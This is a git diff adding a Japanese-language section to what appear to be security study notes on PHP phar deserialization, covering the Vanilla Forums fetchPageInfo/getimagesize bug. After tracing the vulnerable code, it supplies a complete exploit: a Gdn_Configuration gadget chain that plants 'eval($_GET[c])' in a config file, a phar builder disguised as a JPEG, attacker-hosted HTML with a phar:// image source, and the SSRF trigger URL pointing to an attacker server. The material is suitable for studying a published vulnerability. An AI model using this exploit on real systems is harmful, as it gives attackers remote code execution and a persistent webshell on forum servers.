@@ -1157,10 +1157,154 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
 ```txt
 http://200.136.252.42/share/phar%3a%2f%2fIMAGE_PATH
 ```
-##
+## "phar://" / getimagesize (Vanilla Forums domGetImagesgetimagesize)
 https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html  
 - **entrypoint**  
-- **payload**  
+`library/core/functions.general.php`の`DashboardController`にユーザー定義の関数`fetchPageInfo`があり、名前から察するに指定した`$url`にリクエストを出してくれるっぽい。  
+これだけでもすでにSSRFの脆弱性だが…  
+`library/core/functions.general.php`  
+`$pageHtml = $request->request([`でリクエストを送信できる！これだけでも多分良くない。  
+`$images = domGetImages($dom, $url); `でリクエストから返ってきたデータ(html)を解析して`<img`要素の画像関連の情報を取得するっぽい。  
+```php
+class ImportController extends DashboardController {
+
+    ...
+
+    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {      // 0
+        $pageInfo = [
+            'Url' => $url,
+            'Title' => '',
+            'Description' => '',
+            'Images' => [],
+            'Exception' => false
+        ];
+
+        try {
+
+            ...
+
+            $request = new ProxyRequest();
+            $pageHtml = $request->request([
+                'URL' => $url,
+                'Timeout' => $timeout,
+                'Cookies' => $sendCookies,
+                'Redirects' => true,
+            ]);                                                                                    // 1
+
+            if (!$request->status()) {
+                throw new Exception('Couldn\'t connect to host.', 400);
+            }
+
+            $dom = pQuery::parseStr($pageHtml);                                                    // 2
+            if (!$dom) {
+                throw new Exception('Failed to load page for parsing.');
+            }
+
+            ...
+
+            // Page Images
+            if (count($pageInfo['Images']) == 0) {
+                $images = domGetImages($dom, $url);                                                // 3
+                $pageInfo['Images'] = array_values($images);
+            }
+```
+`domGetImages`関数の中身を見る。  
+`absoluteSource`というユーザー定義の関数で`<img src=`の値を取得していると考えられる。  
+```php
+    function domGetImages($dom, $url, $maxImages = 4) {
+        $images = [];
+        foreach ($dom->query('img') as $element) {                                      // 4
+            $images[] = [
+                'Src' => absoluteSource($element->attr('src'), $url),                   // 5
+                'Width' => $element->attr('width'),
+                'Height' => $element->attr('height'),
+            ];
+        }
+
+        ...
+```
+実際、`<img src=`の値がちゃんとURLの形式になっているのかどうかを`parse_url`で確認している。  
+攻撃者によってコントロール可能な文字列が`parse_url`に入っているけどこれは脆弱性ではないっぽい？？  
+```php
+   function absoluteSource($srcPath, $url) {
+        // If there is a scheme in the srcpath already, just return it.
+        if (!is_null(parse_url($srcPath, PHP_URL_SCHEME))) {                    // 6
+            return $srcPath;                                                    // 7
+        }
+
+    ...
+
+    }
+```
+次に、`domGetImages`の続きを見ると、`$image = $imageInfo['Src'];`,`getimagesize($image); `で攻撃者によって制御可能な文字列が`getimagesize`に入る！  
+したがって、ここに`phar://.../exploit.phar`を指定すればRCEできる！  
+Vanillaで使える`Gdn_Configuration`を使ったPOPgadgetを使ってRCEできるらしい。  
+```php
+    function domGetImages($dom, $url, $maxImages = 4) {
+
+        ...
+
+        // Sort by size, biggest one first
+        $imageSort = [];
+        // Only look at first 4 images (speed!)
+        $i = 0;
+        foreach ($images as $imageInfo) {
+            $image = $imageInfo['Src'];                                                 // 8
+
+            if (strpos($image, 'doubleclick.') != false) {
+                continue;
+            }
+
+            try {
+                if ($imageInfo['Height'] && $imageInfo['Width']) {
+                    $height = $imageInfo['Height'];
+                    $width = $imageInfo['Width'];
+                } else {
+                    list($width, $height) = getimagesize($image);                       // 9
+                }
+```
+以下で`poc.jpg`を作成する。  
+これを何らかの方法で対象にアプロードして、そのパスも特定しておく。  
+```php
+// custom pop chain
+class Gdn_ConfigurationSource{
+    public function __construct(){
+        $this->Type = "file";
+        $this->Source = "/var/www/html/conf/constants.php";
+        $this->Group = 'a=eval($_GET[c]);//';
+        $this->Settings[""] = "";       
+        $this->Dirty = true;
+        $this->ClassName = "Gdn_ConfigurationSource";
+    }
+}
+class Gdn_Configuration {
+    public $sources = [];
+    public function __construct(){
+        $this->sources['si'] = new Gdn_ConfigurationSource();
+    }
+}
+
+// create new Phar
+$phar = new Phar('poc.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+// add our object as meta data
+$phar->setMetadata(new Gdn_Configuration());
+$phar->stopBuffering();
+
+// we rename it now
+rename("poc.phar", "poc.jpg");
+```
+攻撃サーバーに以下のコンテンツを用意しておいて、  
+```txt
+<html><body><img src="phar:///var/www/html/uploads/6O51ZT69P0S4.jpg">a</img></body></html>
+```
+以下でこの攻撃者サーバーにアクセスさせればRCE！  
+```txt
+http://target/index.php?p=/dashboard/utility/fetchPageInfo/http:%2f%2f[attacker-web-server]:9090%2f
+```
 ##
 - **entrypoint**  
 - **payload**  
